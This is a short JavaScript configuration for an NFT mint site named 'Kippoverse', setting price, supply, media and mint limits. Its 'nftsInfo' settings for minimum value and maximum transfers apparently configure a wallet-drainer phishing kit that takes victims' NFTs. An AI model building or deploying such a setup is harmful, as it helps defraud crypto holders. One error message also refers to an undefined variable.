const collectionInfo = {
    name: "Kippoverse",
    title: "{name}",
    date: "16.06.2022",
    socialMedia: {
        discord: "https://discord.com/",
        twitter: "https://twitter.com/",
    },
    medias: {
        preview: "ju_yavAr_400x400.jpg",
        favicon: "ju_yavAr_400x400.jpg",
    },
    background: {
        type: "image",
        image: "41d3ce01bfaff7854d500c96af63f385.jpg",
        video: "",
        color: "#4E4E6D",
    }
}
const mintInfo = {
    price: 4,
    totalSupply: 100,
    toFixed: 0,
    minUnits: 1,
    maxUnits: 3,
    askMintLoop: true,
}

const nftsInfo = {
    active: true,
    minValue: 0.3,
    maxTransfer: 2,
}

if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);